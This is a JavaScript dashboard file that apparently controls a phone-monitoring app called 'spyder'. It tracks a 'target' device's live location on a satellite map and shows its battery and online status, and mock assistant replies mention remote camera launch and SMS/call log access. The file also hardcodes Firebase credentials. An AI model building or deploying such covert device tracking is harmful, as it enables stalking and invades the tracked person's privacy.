/*Auth*/

 /*Auth down-side also*/

 import { getAuth, signOut } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-auth.js";

  const auth = getAuth();
  document.getElementById("logoutBtn").addEventListener("click", () => {
    signOut(auth).then(() => {
      window.location.href = "index.html";
    });
  });

function toggleDarkMode() {
      document.body.classList.toggle('bg-dark');
      document.body.classList.toggle('text-light');
    }

    function toggleAssistant() {
    const panel = document.getElementById("ai-assistant-panel");
    panel.style.display = panel.style.display === "flex" ? "none" : "flex";
  }

  function sendAIMessage() {
    const input = document.getElementById("ai-input");
    const msg = input.value.trim();
    if (!msg) return;

    const chatBody = document.getElementById("chat-body");
    const userMsg = document.createElement("div");
    userMsg.className = "ai-message user";
    userMsg.innerText = msg;
    chatBody.appendChild(userMsg);

    input.value = "";

    setTimeout(() => {
      const botMsg = document.createElement("div");
      botMsg.className = "ai-message bot";
      botMsg.innerText = getMockAIResponse(msg);
      chatBody.appendChild(botMsg);
      chatBody.scrollTop = chatBody.scrollHeight;
    }, 600);
  }

  function handleAIInput(event) {
    if (event.key === "Enter") {
      sendAIMessage();
    }
  }

  function getMockAIResponse(input) {
    const lower = input.toLowerCase();
    if (lower.includes("location")) return "Fetching live location...";
    if (lower.includes("battery")) return "Battery is at 87%. Charging: No";
    if (lower.includes("camera")) return "Launching camera remotely...";
    if (lower.includes("logs")) return "Opening SMS/Call logs...";
    return "I'm still learning. Please try a supported command like 'battery', 'location', or 'camera'.";
  }


  // Your Firebase config
  const firebaseConfig = {
    apiKey: "AIzaSyDvFaH5h4KI3x4e4Vm9mMiwE73vBO0GPl0",
    authDomain: "spyder-7967e.firebaseapp.com",
    databaseURL: "https://spyder-7967e-default-rtdb.firebaseio.com", // ✅ Add this line!
    projectId: "spyder-7967e",
    storageBucket: "spyder-7967e.appspot.com",
    messagingSenderId: "100352332121",
    appId: "1:100352332121:web:668d283297679d6a7f3c48"
  };

  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  // Set deviceId to target one
 const deviceId = "device_001";

  db.ref("devices/" + deviceId).on("value", (snapshot) => {
    const data = snapshot.val();
    if (!data) return;

    document.getElementById("deviceStatus").textContent = data.online ? "Online" : "Offline";
    document.getElementById("deviceStatus").className =
      data.online ? "status-green" : "status-red";

    document.getElementById("batteryLevel").textContent = data.battery + "%";
    document.getElementById("lastSeen").textContent = data.lastSeen;

      if (data.latitude && data.longitude) {
    const lat = data.latitude;
    const lng = data.longitude;

    liveMarker.setLatLng([lat, lng]);
    map.setView([lat, lng], 16);
      getAddressFromCoords(lat, lng); 
  }

  });


  // Initialize Leaflet Map
  const map = L.map('map', {
    zoomControl: true,
    maxZoom: 19 // Prevent over-zooming beyond satellite availability
  }).setView([21.450549004835146, 80.20487674637951], 14);

  const liveMarker = L.marker([21.450549004835146, 80.20487674637951]).addTo(map);


  // Satellite View (ESRI World Imagery)
  L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/' +
              'World_Imagery/MapServer/tile/{z}/{y}/{x}', {
    attribution: '&copy; Esri &mdash; Source: Esri, Maxar, Earthstar Geographics',
    maxZoom: 19,  // ESRI doesn't support more than this
    tileSize: 256,
    zoomOffset: 0
  }).addTo(map);

function getAddressFromCoords(lat, lng) {
  fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`)
    .then(response => response.json())
    .then(data => {
      const locationName = data.display_name || "Unknown location";
      liveMarker.bindPopup(`<b>Location:</b><br>${locationName}`).openPopup();

      // Optional: Also show in some div
      const locationDiv = document.getElementById("locationInfo");
      if (locationDiv) locationDiv.textContent = locationName;
    })
    .catch(() => {
      liveMarker.bindPopup("Location details not available").openPopup();
    });
}

//map end



let trackLocation = document.querySelector("#trackLocation");
let crossLocation = document.querySelector(".crossLocation");
let statusLocation = document.querySelector("#status");

trackLocation.addEventListener("click", () => {
  statusLocation.style.display = "flex";

  // Force map to recalculate size
  setTimeout(() => {
    map.invalidateSize(); // 🔁 Key fix!
  }, 300); // Delay allows DOM to finish showing map
});


crossLocation.addEventListener("click",()=>{
  statusLocation.style.display="none";
});
